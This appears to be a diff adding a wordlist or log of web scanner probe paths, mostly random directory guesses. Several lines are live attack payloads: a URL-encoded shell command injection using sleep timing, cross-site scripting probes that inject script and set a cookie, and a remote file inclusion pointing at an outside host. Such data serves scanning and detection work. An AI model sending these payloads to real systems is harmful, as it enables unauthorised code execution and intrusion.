@@ -1,0 +1,20 @@
+/javascript/ingress.properties
+/_shoutcast/
+/msi traymanager/
+/cs_indiana/
+%0A%20str%3D%24%28echo%20MKJXCW%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527
+/intro_black/
+/javascript/computer.cfm
+/javascript/software.asmx
+/girlfriend135/
+/20051220-11/
+/?<script>document.cookie="testqppc=8767;"</script>
+/gpb/include/gpb.inc.php?root_path=http://192.168.202.118:8080/tzhfyzkbomspvm??
+/en-us/jnv890lt.cfm?<script>cross_site_scripting.nasl</script>
+/w32rbotaqs/
+/javascript/7z.xml
+/107845/
+/design6/
+/051318/
+/d04725r/
+/130603/
